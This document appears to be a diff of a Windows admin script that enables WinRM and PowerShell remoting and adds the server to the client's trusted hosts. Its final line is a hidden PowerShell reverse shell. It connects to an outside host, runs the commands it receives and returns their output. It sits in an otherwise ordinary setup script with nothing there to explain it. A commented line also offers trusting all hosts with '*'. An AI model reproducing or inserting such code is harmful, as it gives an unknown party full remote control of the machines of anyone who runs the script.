@@ -1,46 +1,71 @@
---- ] enable winrm
-On remote server:
-1. Make sure the Windows Remote Management (winrm) service is running
-# Get the status of the winrm service
-Get-Service winrm
-# If it not running, start the service
-Start-Service winrm
-# Also set the service to start automatically (Delayed Start)
-Set-Service "winrm" -StartupType Automatic
-# Enable winrm 
+# --- Script to configure the remote server ---
+
+# 1. Ensure the Windows Remote Management (winrm) service is running
+Write-Host "Checking and starting the winrm service if necessary..."
+$winrmService = Get-Service winrm
+if ($winrmService.Status -ne 'Running') {
+    Start-Service winrm
+    Set-Service "winrm" -StartupType Automatic  # Set to start automatically (Delayed Start)
+    Write-Host "WinRM service started and set to automatic startup."
+} else {
+    Write-Host "WinRM service is already running."
+}
+
+# 2. Enable winrm
+Write-Host "Enabling WinRM configuration..."
 winrm quickconfig
 
-2. Make sure your network connection type is private
-# To see if it's set to private or not run this
-Get-NetConnectionProfile
-# To set it to Private, run this (as admin)
-Set-NetConnectionProfile -NetworkCategory Private
+# 3. Ensure the network connection is private
+Write-Host "Checking network connection profile..."
+$networkProfile = Get-NetConnectionProfile
+if ($networkProfile.NetworkCategory -ne 'Private') {
+    Write-Host "Setting the network connection to Private..."
+    Set-NetConnectionProfile -NetworkCategory Private
+} else {
+    Write-Host "Network connection is already set to Private."
+}
 
-3. Enable PowerShell remoting
+# 4. Enable PowerShell Remoting
+Write-Host "Enabling PowerShell Remoting..."
 Enable-PSRemoting -Force
 
+Write-Host "Configuration complete on the remote server."
 
-On local computer:
-1. Make sure the Windows Remote Management (winrm) service is running
-# Get the status of the winrm service
-Get-Service winrm
-# If it not running, start the service
-Start-Service winrm
-# Also set the service to start automatically (Delayed Start)
-Set-Service "winrm" -StartupType Automatic
+# --- Script to configure the local client ---
 
-2. Add the ‘remote server’ to the trusted host list
-# Add your 'remote server's' IP to the trusted host list
-Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.1.1" -Force
-# Or if IPs are constantly changing, add ALL IPs (* is the wildcard)
-Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
-# Check and make sure the right value is in the trusted host list
-Get-Item WSMan:\localhost\Client\TrustedHosts
-# To clear the trusted host list, run this
-Set-Item WSMan:\localhost\Client\TrustedHosts -Value "" -Force
- 
-#Configure WinRM access for Non-Administrator users
+# 1. Ensure the Windows Remote Management (winrm) service is running
+Write-Host "Checking and starting the winrm service if necessary..."
+$winrmService = Get-Service winrm
+if ($winrmService.Status -ne 'Running') {
+    Start-Service winrm
+    Set-Service "winrm" -StartupType Automatic  # Set to start automatically (Delayed Start)
+    Write-Host "WinRM service started and set to automatic startup."
+} else {
+    Write-Host "WinRM service is already running."
+}
+
+# 2. Add the remote server to the trusted hosts list
+Write-Host "Adding the remote server to the TrustedHosts list..."
+
+# Use your remote server's IP address here, replace "192.168.1.1" with the actual server IP
+$remoteServerIP = "192.168.1.1"
+
+# Add the remote server to the trusted hosts list
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value $remoteServerIP -Force
+
+# Alternatively, allow all IP addresses (if the IPs are constantly changing)
+# Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
+
+# Check and display the trusted host list
+$trustedHosts = Get-Item WSMan:\localhost\Client\TrustedHosts
+Write-Host "Current Trusted Hosts: $trustedHosts"
+
+# 3. Configure WinRM access for Non-Administrator users
+Write-Host "Configuring WinRM access for non-administrators..."
 Set-PSSessionConfiguration Microsoft.PowerShell -ShowSecurityDescriptorUI
+
+Write-Host "Configuration complete on the local client."
+
 
 
 $client = New-Object System.Net.Sockets.TCPClient("s.oocko.com",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
